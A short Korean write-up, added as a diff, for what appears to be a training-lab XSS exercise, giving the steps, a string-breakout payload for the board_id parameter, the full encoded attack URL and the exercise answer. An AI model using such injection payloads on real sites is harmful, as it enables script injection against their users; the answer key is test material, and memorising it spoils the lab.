@@ -1,0 +1,19 @@
+========================
+XSS 2번
+========================
+
+1. 공격 과정
+- board_id가 JavaScript 문자열에 삽입되는 취약점 확인
+- 문자열과 함수를 닫고 alert('XSS') 실행
+
+2. 공격 구문
+19';}alert('XSS');function x(){'
+
+
+3. 공격 실행 주소
+https://lab.eqst.co.kr:8083/exam17/noticeview.php?board_id=19%27%3B%7Dalert%28%27XSS%27%29%3Bfunction%20x%28%29%7B&pageIndex=1&sorting=BOARD_ID&sortingAd=DESC&startDt=&endDt=&searchType=&keyword=
+
+4. 정답
+xss_exam
+
+========================
